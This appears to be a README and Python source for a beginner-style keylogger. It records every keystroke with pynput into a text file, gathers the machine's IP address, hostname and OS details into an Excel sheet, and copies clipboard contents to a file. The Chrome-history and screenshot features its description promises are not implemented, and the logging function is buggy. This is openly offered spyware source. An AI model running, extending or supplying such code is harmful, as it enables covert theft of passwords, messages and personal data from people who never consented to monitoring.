# keylogger
Tracks keystrokes (pynput.keyboard), recording in a text file for user activity monitoring. Gathers system info (socket, platform, pandas), storing in Excel for a comprehensive overview. Captures clipboard (win32clipboard) to retain important snippets in a text file. Retrieves Chrome history (datetime, sqlite3, pandas), also capturing png SC.
from pynput.keyboard import Key, Listener #recording keystrokes
import sqlite3 #get the data from a database
import datetime #get the date
import socket #get computer information
import platform #get computer information
from requests import get #get information from a website
import win32clipboard #get clipboard information
from PIL import ImageGrab #get screenshot
import pandas as pd #manipulate with the aquired data


#records keystrokes and store it in text file
k = []

#function to record the keystroke
def on_press(key):
    k.append(key)
    write_file(k)
    print(key)

#function to write the data to a text file
def write_file(var):
    with open("logs.txt","a") as f:
        for i in var:
            new_var = str(i).replace("'","")
        f.write(new_var)
        f.write(" ")

#function to stop the recording       
def on_release(key):
    if key == Key.esc:
        return False

#listener function
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join() 


#gets the computer information and store it in text file

date = datetime.date.today() #get the data

ip_address = socket.gethostbyname(socket.gethostname()) #get the IP address

processor = platform.processor() #get the processor details

system = platform.system() #get the system details
release = platform.release()

host_name = socket.gethostname() #get the host name

# Create a DataFrame with computer information
data = {
    'Metric': ['Date','IP Address', 'Processor', 'System', 'Release', 'Host Name'],
    'Value': [date,ip_address, processor, system, release, host_name]
}
df = pd.DataFrame(data)

# Save the DataFrame to an Excel file
df.to_excel('keystrokes.xlsx', index=False)

#get the clipboard information and store it in text file

def copy_clipboard():
    current_date = datetime.datetime.now()
    with open("clipboard.txt", "a") as f:
        
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard() #get the clipboard data and store it in pasted_data

            f.write("\n")
            f.write("date and time:"+ str(current_date)+"\n")
            f.write("clipboard data: \n "+ pasted_data) #write the clipboard data into the text file
        
copy_clipboard()
